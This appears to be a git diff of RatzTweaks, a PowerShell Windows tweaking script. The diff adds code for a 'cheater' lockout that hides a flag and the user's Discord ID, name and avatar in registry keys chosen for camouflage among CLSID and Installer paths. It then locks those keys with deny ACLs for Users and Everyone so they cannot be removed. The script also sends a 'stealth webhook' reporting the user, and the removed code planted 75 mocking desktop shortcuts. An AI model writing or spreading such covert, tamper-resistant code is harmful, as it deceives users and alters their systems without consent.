@@ -64,10 +64,11 @@ function Get-ObfuscatedRegistryPath {
     
     $seed = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode().ToString('X8')
     
+    # Use registry paths that have existing GUID/HWID-style subkeys for perfect camouflage
     $basePaths = @(
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\Settings"
         "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions"
-        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
+        "HKLM:\SOFTWARE\Classes\CLSID"
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products"
     )
 
     $selectedIndex = [Math]::Abs($seed.GetHashCode()) % $basePaths.Count
@@ -155,14 +156,6 @@ if ($needDownload) {
         $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
         exit 1
     }
-}
-if ($PSVersionTable.PSEdition -ne 'Desktop' -or $PSVersionTable.Major -gt 5) {
-    $msg = @"
-RatzTweaks requires Windows PowerShell 5.1.
-Please run this script using powershell.exe.
-"@
-    [Console]::WriteLine($msg)
-    exit 1
 }
 
 # --- Administrator privilege check (required for HKLM registry writes) ---
@@ -2649,6 +2642,74 @@ setTimeout(checkStatus, 2000);
                     Set-ItemProperty -Path $lockoutKeyPath -Name $avatarReg.ValueName -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                 }
                 
+                # Lock down the registry key with strict ACLs to prevent deletion/modification
+                try {
+                    [Console]::WriteLine('Route:/cheater-found: Applying registry key protection...')
+                    [Console]::WriteLine("Route:/cheater-found: Lockout key path: $lockoutKeyPath")
+                    
+                    # Get current ACL (PowerShell registry paths work directly with Get-Acl)
+                    $acl = Get-Acl -Path $lockoutKeyPath
+                    
+                    # Disable inheritance and preserve existing rules
+                    $acl.SetAccessRuleProtection($true, $true)
+                    
+                    # Remove any existing rules that allow Users or Everyone to modify/delete
+                    $acl.Access | Where-Object { 
+                        ($_.IdentityReference -match 'Users|Everyone') -and 
+                        ($_.RegistryRights -match 'Delete|SetValue|CreateSubKey')
+                    } | ForEach-Object {
+                        [Console]::WriteLine("Route:/cheater-found: Removing modify access for: $($_.IdentityReference)")
+                        $acl.RemoveAccessRule($_) | Out-Null
+                    }
+                    
+                    # Create deny rule for standard users trying to delete or modify
+                    # Using WriteKey which includes SetValue, CreateSubKey, and other write operations
+                    $denyRule = New-Object System.Security.AccessControl.RegistryAccessRule(
+                        'BUILTIN\Users',
+                        [System.Security.AccessControl.RegistryRights]::Delete -bor 
+                        [System.Security.AccessControl.RegistryRights]::WriteKey -bor
+                        [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
+                        [System.Security.AccessControl.RegistryRights]::TakeOwnership,
+                        [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
+                        [System.Security.AccessControl.PropagationFlags]::None,
+                        [System.Security.AccessControl.AccessControlType]::Deny
+                    )
+                    $acl.AddAccessRule($denyRule)
+                    [Console]::WriteLine('Route:/cheater-found: Added Deny rule for BUILTIN\Users (Delete, WriteKey, ChangePermissions, TakeOwnership)')
+                    
+                    # Add second deny rule for Everyone group as extra protection
+                    $denyRuleEveryone = New-Object System.Security.AccessControl.RegistryAccessRule(
+                        'Everyone',
+                        [System.Security.AccessControl.RegistryRights]::Delete -bor 
+                        [System.Security.AccessControl.RegistryRights]::WriteKey -bor
+                        [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
+                        [System.Security.AccessControl.RegistryRights]::TakeOwnership,
+                        [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
+                        [System.Security.AccessControl.PropagationFlags]::None,
+                        [System.Security.AccessControl.AccessControlType]::Deny
+                    )
+                    $acl.AddAccessRule($denyRuleEveryone)
+                    [Console]::WriteLine('Route:/cheater-found: Added Deny rule for Everyone (Delete, WriteKey, ChangePermissions, TakeOwnership)')
+                    
+                    # Apply the modified ACL
+                    Set-Acl -Path $lockoutKeyPath -AclObject $acl
+                    [Console]::WriteLine('Route:/cheater-found: ACL protection applied successfully')
+                    
+                    # Verify the deny rules were applied
+                    $verifyAcl = Get-Acl -Path $lockoutKeyPath
+                    $denyCount = ($verifyAcl.Access | Where-Object { $_.AccessControlType -eq 'Deny' }).Count
+                    [Console]::WriteLine("Route:/cheater-found: Verification: Found $denyCount Deny rules (expected: 2)")
+                    
+                    if ($denyCount -ge 2) {
+                        [Console]::WriteLine('Route:/cheater-found: [OK] Registry key is now protected with ACL deny rules')
+                    } else {
+                        [Console]::WriteLine('Route:/cheater-found: [WARN] ACL protection may not be fully applied')
+                    }
+                } catch {
+                    [Console]::WriteLine("Route:/cheater-found: [WARN] Failed to apply ACL protection: $($_.Exception.Message)")
+                    # Don't throw - lockout still functional even without ACL
+                }
+                
                 [Console]::WriteLine('Route:/cheater-found: [OK] Registry lockout set with cached user info')
             } catch {
                 [Console]::WriteLine("Route:/cheater-found: [FAIL] FAILED to set lockout: $($_.Exception.Message)")
@@ -2757,172 +2818,14 @@ setTimeout(checkStatus, 2000);
             [Console]::WriteLine("Route:/main-tweaks: [OK] Authentication check passed! Proceeding with tweaks...")
             [Console]::WriteLine("========================================")
             
-            # Check if detection was triggered
+            # Check if detection was triggered - redirect to /cheater-found
+            # (all lockout logic is handled at /cheater-found route, not here - prevents duplicates)
             if ($global:DetectionTriggered) {
-                [Console]::WriteLine("Route:/main-tweaks ($method) CHEATER DETECTED - initiating lockout")
-                
-                # Send webhook notification
-                [Console]::WriteLine('Route:/main-tweaks: sending webhook notification...')
-                try {
-                    $detectionMethod = if ($global:DetectionMethod) { $global:DetectionMethod } else { 'Unknown' }
-                    Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -DetectionMethod $detectionMethod
-                    [Console]::WriteLine('Route:/main-tweaks: stealth webhook sent successfully')
-                    # Give the webhook time to complete
-                    Start-Sleep -Seconds 2
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: stealth webhook failed: $($_.Exception.Message)")
-                }
-                
-                # Set registry lockout and cache user info (using obfuscated paths)
-                try {
-                    [Console]::WriteLine('Route:/main-tweaks: Setting registry lockout...')
-                    
-                    # Get obfuscated registry paths
-                    $lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
-                    $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
-                    $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
-                    $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
-                    
-                    $lockoutKeyPath = $lockoutReg.Path
-                    
-                    # Ensure the registry key exists (create parent paths if needed)
-                    if (-not (Test-Path $lockoutKeyPath)) {
-                        [Console]::WriteLine("Route:/main-tweaks: Creating obfuscated registry key at: $lockoutKeyPath")
-                        try {
-                            # Split the path and create each level
-                            $pathParts = $lockoutKeyPath -replace '^HKLM:\\', '' -split '\\'
-                            $currentPath = 'HKLM:'
-                            foreach ($part in $pathParts) {
-                                $currentPath = Join-Path $currentPath $part
-                                if (-not (Test-Path $currentPath)) {
-                                    [Console]::WriteLine("Route:/main-tweaks: Creating path segment: $currentPath")
-                                    New-Item -Path $currentPath -Force -ErrorAction Stop | Out-Null
-                                }
-                            }
-                            [Console]::WriteLine("Route:/main-tweaks: [OK] Registry path created successfully")
-                        } catch {
-                            [Console]::WriteLine("Route:/main-tweaks: [FAIL] Failed to create registry path: $($_.Exception.Message)")
-                            throw
-                        }
-                    }
-                    
-                    # Set lockout flag using obfuscated value name
-                    [Console]::WriteLine('Route:/main-tweaks: Setting lockout flag')
-                    Set-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -Value 1 -Type DWord -Force -ErrorAction Stop
-                    
-                    # Verify it was set
-                    $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -ErrorAction SilentlyContinue
-                    [Console]::WriteLine("Route:/main-tweaks: Lockout value verified: $($verifyLockout.($lockoutReg.ValueName))")
-                    
-                    # Cache user info for repeat offender notifications using obfuscated value names
-                    if ($global:DiscordUserId) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserId")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name $userIdReg.ValueName -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
-                    }
-                    if ($global:DiscordUserName) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserName")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name $userNameReg.ValueName -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
-                    }
-                    if ($global:DiscordAvatarUrl) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching AvatarUrl")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name $avatarReg.ValueName -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
-                    }
-                    
-                    # Lock down the registry key with strict ACLs to prevent deletion/modification
-                    try {
-                        [Console]::WriteLine('Route:/main-tweaks: Applying registry key protection...')
-                        
-                        # Convert registry path to format compatible with Get-Acl
-                        $regKeyForAcl = $lockoutKeyPath -replace '^HKLM:\\', 'HKLM:\'
-                        
-                        # Get current ACL
-                        $acl = Get-Acl -Path $regKeyForAcl
-                        
-                        # Disable inheritance and preserve existing rules
-                        $acl.SetAccessRuleProtection($true, $true)
-                        
-                        # Remove any existing rules that allow Users or Everyone to modify/delete
-                        $acl.Access | Where-Object { 
-                            ($_.IdentityReference -match 'Users|Everyone') -and 
-                            ($_.RegistryRights -match 'Delete|SetValue|CreateSubKey')
-                        } | ForEach-Object {
-                            [Console]::WriteLine("Route:/main-tweaks: Removing modify access for: $($_.IdentityReference)")
-                            $acl.RemoveAccessRule($_) | Out-Null
-                        }
-                        
-                        # Create deny rule for standard users trying to delete or modify
-                        $denyRule = New-Object System.Security.AccessControl.RegistryAccessRule(
-                            'BUILTIN\Users',
-                            [System.Security.AccessControl.RegistryRights]::Delete -bor 
-                            [System.Security.AccessControl.RegistryRights]::SetValue -bor
-                            [System.Security.AccessControl.RegistryRights]::CreateSubKey,
-                            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor 
-                            [System.Security.AccessControl.InheritanceFlags]::ObjectInherit,
-                            [System.Security.AccessControl.PropagationFlags]::None,
-                            [System.Security.AccessControl.AccessControlType]::Deny
-                        )
-                        $acl.AddAccessRule($denyRule)
-                        
-                        # Apply the modified ACL
-                        Set-Acl -Path $regKeyForAcl -AclObject $acl -ErrorAction Stop
-                        
-                        [Console]::WriteLine('Route:/main-tweaks: [OK] Registry key protected with strict ACLs')
-                    } catch {
-                        [Console]::WriteLine("Route:/main-tweaks: [WARN] Failed to apply ACL protection: $($_.Exception.Message)")
-                    }
-                    
-                    [Console]::WriteLine('Route:/main-tweaks: [OK] Registry lockout set with cached user info')
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: [FAIL] FAILED to set lockout: $($_.Exception.Message)")
-                    [Console]::WriteLine("Route:/main-tweaks: Exception type: $($_.Exception.GetType().FullName)")
-                    [Console]::WriteLine("Route:/main-tweaks: Stack trace: $($_.ScriptStackTrace)")
-                }
-                
-                try {
-                    # Create 75 desktop shortcuts: 25 of each phrase.
-                    # Target: Notepad (harmless when clicked). Icon: generic from shell32.dll.
-
-                    $desktop   = [Environment]::GetFolderPath('Desktop')            # Current user's Desktop
-                    $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
-                    $eachCount = 25                                                 # 25 * 3 = 75
-                    $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
-                    $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
-                    $icon      = "$iconDll,2"
-
-                    $wsh = New-Object -ComObject WScript.Shell
-
-                    foreach ($p in $phrases) {
-                        1..$eachCount | ForEach-Object {
-                            $fileName = '{0} ({1}).lnk' -f $p, $_
-                            $lnkPath  = Join-Path $desktop $fileName
-
-                            $shortcut = $wsh.CreateShortcut($lnkPath)
-                            $shortcut.TargetPath  = $target
-                            $shortcut.IconLocation = $icon
-                            $shortcut.Description = $p
-                            $shortcut.Save()
-                        }
-                    }
-
-                    Write-Host "Created $($phrases.Count * $eachCount) shortcuts on $desktop"
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: failed to create shortcuts: $($_.Exception.Message)")
-                }
-
-                # Serve the cheater-detected page directly with 200 OK
-                & $send $ctx 200 'text/html' $cheaterHtml
-                
-                # Schedule script termination with longer delay to ensure all operations complete
-                [Console]::WriteLine('Route:/main-tweaks: scheduling script termination in 10 seconds...')
-                Start-Job -ScriptBlock {
-                    Start-Sleep -Seconds 10
-                    Stop-Process -Id $using:PID -Force
-                } | Out-Null
-                
-                # Keep the listener running briefly to ensure the page loads, but then stop
-                Start-Sleep -Seconds 2
-                $listener.Stop()
-                return # Exit the request loop
+                [Console]::WriteLine("Route:/main-tweaks ($method) CHEATER DETECTED - redirecting to /cheater-found")
+                $ctx.Response.StatusCode = 302
+                $ctx.Response.RedirectLocation = "$prefix/cheater-found"
+                try { $ctx.Response.Close() } catch {}
+                continue
             }
             
             # This part is reached only if no detection occurred - send "clean user" webhook
